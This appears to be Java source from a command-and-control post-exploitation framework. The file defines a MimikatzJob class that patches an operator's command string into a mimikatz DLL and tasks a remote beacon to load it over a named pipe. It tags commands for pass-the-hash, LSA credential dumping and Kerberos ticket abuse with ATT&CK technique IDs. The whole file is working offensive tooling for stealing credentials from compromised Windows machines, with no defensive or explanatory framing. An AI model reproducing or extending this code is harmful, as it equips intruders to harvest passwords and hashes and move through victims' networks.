package beacon.jobs;

import beacon.Job;
import beacon.TaskBeacon;
import common.CommonUtils;
import common.Packer;

public class MimikatzJob
        extends Job {
    protected String commandz;

    public MimikatzJob(TaskBeacon tasker, String commandz) {
        super(tasker);
        this.commandz = commandz;
    }

    @Override
    public String getDescription() {
        return "Tasked beacon to run mimikatz's " + this.commandz + " command";
    }

    @Override
    public String getShortDescription() {
        return "mimikatz " + this.commandz.split(" ")[0];
    }

    @Override
    public String getDLLName() {
        if (this.arch.equals("x64")) {
            return "resources/mimikatz-full.x64.dll";
        }
        return "resources/mimikatz-full.x86.dll";
    }

    @Override
    public int getJobType() {
        if (this.commandz.startsWith("@")) {
            return 62;
        }
        return 40;
    }

    @Override
    public String getPipeName() {
        return "mimikatz";
    }

    @Override
    public int getCallbackType() {
        return 32;
    }

    @Override
    public int getWaitTime() {
        return 15000;
    }

    @Override
    public byte[] fix(byte[] mydll) {
        Packer temp = new Packer();
        temp.addStringUTF8(this.commandz, 512);
        mydll = CommonUtils.patch(mydll, "MIMIKATZ ABCDEFGHIJKLMNOPQRSTUVWXYZ", CommonUtils.bString(temp.getBytes()));
        return mydll;
    }

    @Override
    public String getTactic() {
        if (CommonUtils.isin("sekurlsa::pth", this.commandz)) {
            return "T1075";
        }
        if (CommonUtils.isin("lsadump::", this.commandz)) {
            return "T1003";
        }
        if (CommonUtils.isin("kerberos::", this.commandz)) {
            return "T1097";
        }
        if (CommonUtils.isin("sekurlsa::", this.commandz)) {
            return "T1003, T1055";
        }
        return "";
    }
}

